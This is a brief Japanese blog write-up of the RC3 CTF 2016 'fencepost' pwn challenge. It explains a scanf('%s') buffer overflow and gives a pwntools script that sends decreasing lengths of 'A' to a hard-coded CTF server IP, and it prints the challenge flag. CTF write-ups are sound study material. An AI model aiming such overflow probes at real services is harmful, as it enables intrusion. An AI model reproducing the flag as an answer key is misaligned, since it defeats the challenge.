---
layout: post
alias: "/blog/2016/11/21/rc3-ctf-2016-fencepost/"
date: "2016-11-21T17:46:51+09:00"
title: "RC3 CTF 2016: fencepost"
tags: [ "ctf", "writeup", "rc3-ctf", "pwn" ]
---

`scanf("%s", s);`のbofで特定の位置を$0$にするとflagが出てくる。なんだか配布されたのと鯖のとでバイナリが違うっぽいからとりあえず試してみたらflagが降ってきた。まさかこれでいいとは思わなかった。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='52.71.70.98')
parser.add_argument('port', nargs='?', default=2091, type=int)
args = parser.parse_args()

context.log_level = 'debug'
with remote(args.host, args.port) as p:
    for i in range(48, 0, -1):
        p.recvuntil('Password: ')
        p.sendline('A' * i)
```

flag: `RC3-2016-STACKPWN`
